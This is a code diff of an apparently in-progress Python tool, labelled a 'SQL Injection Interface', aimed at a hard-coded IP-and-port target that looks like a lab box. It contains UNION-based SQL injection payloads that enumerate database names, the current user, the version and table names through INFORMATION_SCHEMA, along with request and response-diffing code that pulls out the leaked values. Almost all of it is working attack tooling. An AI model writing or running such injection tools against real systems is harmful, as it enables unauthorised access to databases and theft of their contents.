@@ -3,25 +3,18 @@ from utils import read_headers_file
 import re
 from bs4 import BeautifulSoup
 
-"""
-id=1 UNION ALL SELECT NULL,NULL,SCHEMA_NAME,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- - #DATABASE
-id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -
-
-"""
-test = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
-
-
-
 def get_sqli_info(payload):
     data = [
 		{"data": "database","value":"", "payload":""},
 		{"data": "username","value":"", "payload":""},
 		{"data": "version","value":"", "payload":""},
+        {"data": "tables","value":"", "payload":""},
 	]
     info = [
 		{"payload":"SCHEMA_NAME",	"source":"FROM INFORMATION_SCHEMA.SCHEMATA"}, #Databases
 		{"payload":"user()",		"source":""}, #User
 		{"payload":"@@version",		"source":""}, # DBMS Version
+        {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE "}
 
 	]
     cont = 0
@@ -33,6 +26,10 @@ def get_sqli_info(payload):
         cont += 1
     return data
 
+def add_values_to_data_payload(raw_values, payload):
+    values = raw_values.split()
+    payload['value'] = values
+    print(payload)
 
 def get_request(url):
     response  = requests.get(url)
@@ -83,9 +80,13 @@ def html_diff(text1, text2):
     return " ".join(different_words)
 
 
-url = "http://"+"94.237.61.249:34153/case2.php"
+url = "http://"+"83.136.253.5:51945/case2.php"
 headers = read_headers_file("./headers.txt")
 payload = {"id": "1"}
+test = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
+
+#WORKING CODE
+"""
 response1 = post_request(url, payload, headers).text
 
 
@@ -94,13 +95,44 @@ response2 = post_request(url, payload, headers).text # Payload OK
 
 aux_payloads = get_sqli_info(test)
 database_payload = string_to_json(aux_payloads[0]['payload'])
-
 response3 = post_request(url, database_payload, headers).text
-#print(response3)
-
-#Resultado diferente
 result = html_diff(response1,response3)
-aux_payloads[0]['value'] = result.split()
-print(aux_payloads[0])
-print(len(aux_payloads))
-print(result)
+
+add_values_to_data_payload(result, aux_payloads[0])
+"""
+
+#------------
+def menu(option):
+    global url, payload, test
+    if option == 0:
+        return 0
+    elif option == 10:
+        new_url = str(input("New url:\t\033[0m"))
+        url = new_url
+    run()
+
+def run():
+    print("\nWelcome to your SQL Injection Interface\n")
+    print(f"\033[32m--------------\n|\
+    URL:\033[37m\t\t{url}\033[32m\n|\
+    Vulnerable param:\t\033[37m{payload}\033[32m\n|\
+    SQLi Payload:\t\033[31m{test}\033[32m")
+    print("-------------\n")
+    
+    print("\033[36mENUMERATION")
+    print(f"--------------")
+    enumeration_data = get_sqli_info(test)
+    for data in enumeration_data:
+        print(f"|\t{data['data']}:\t\033[37m{data['value']}\033[36m")
+    print(f"--------------")
+
+    print("\033[33mOPTIONS")
+    print(f"--------------")
+    print("10)\tSet URL")
+    print("11)\tSet Payload")
+    print("\n0) Exit")
+    
+    option = int(input("Choose option:\t"))
+    menu(option)
+
+run()
